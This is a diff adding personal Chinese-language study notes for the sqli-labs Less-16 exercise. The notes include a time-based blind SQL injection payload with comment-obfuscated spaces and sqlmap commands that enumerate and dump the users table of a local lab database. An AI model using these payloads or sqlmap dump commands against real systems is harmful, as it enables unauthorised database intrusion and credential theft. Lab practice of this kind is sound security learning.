@@ -187,3 +187,40 @@ session.sqlite（核心会话库） sqlite 数据库文件，存着 sqlmap 已�
          - `-wal`：Write-Ahead Log，预写日志，正在写入数据的时候，数据先存在这里
          - `-shm`：共享内存文件，用来同步读写 程序正常结束后，这两个一般会自动合并回 session.sqlite；中途强制 Ctrl+C 关掉 sqlmap，它们会留在目录里。
 **==🟡记得下次输出时候把它弄到d盘文件夹里，否则就在默认c盘appdata里==**
+## 16 "")
+1.如果用burp的话还是内嵌浏览器打开，拦截，post方法，右键发送到reapter，更改uname后面内容
+```
+uname=admin")/**/and/**/if(substr(database(),1,1)='s',sleep(3),1)#&passwd=1&submit=Submit
+```
+//在这是因为即使用%20来表达空格还是会出错，而mysql会把//默认为空格
+*布尔盲注判断语句是if(条件,1,0)；一般1为真，0为假，前者页面正常*
+*时间盲注是if(条件,sleep(3),1)*
+2.
+```
+sqlmap -u "http://127.0.0.1/sqli-labs/Less-16/" --data="uname=1&passwd=1&submit=Submit" -p uname --technique=T --batch
+```
+参数说明：
+- `-u`：目标 url
+- `--data`：POST 表单数据
+- `-p uname`：只测试 uname 参数
+- `--technique=T`：**强制只用时间盲注**（T=time），避开布尔 / 联合检测
+- `--batch`：自动回答 y/n，不用手动交互
+或者burp打开复制raw到sqlmap新建文本文档里面参数说明：
+全部查询
+```
+sqlmap -r less16.txt -p uname --technique=T -D security -T users --dump --batch
+```
+部分查询
+```
+# 查所有库
+--dbs
+# 查当前库
+--current-db
+# 查security库的表
+-D security --tables
+# 查users表的字段
+-D security -T users --columns
+# 拖用户名密码数据
+-D security -T users --dump
+```
+## 17修改密码
